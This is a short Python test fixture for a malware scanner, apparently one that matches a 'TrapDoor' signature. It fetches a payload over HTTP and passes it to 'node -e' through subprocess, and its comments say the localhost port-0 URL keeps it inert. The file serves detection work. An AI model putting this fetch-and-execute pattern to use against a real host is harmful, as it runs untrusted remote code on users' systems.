# Fixture: PYSRC-009 + PYSRC-010 compound. Exact TrapDoor signature:
# fetch payload + fork-exec via node -e. URL points to localhost port 0,
# so the fixture is inert; the file shape is what we detect.
import urllib.request
import subprocess
payload = urllib.request.urlopen("http://127.0.0.1:0/synthetic").read()
subprocess.run(["node", "-e", payload])
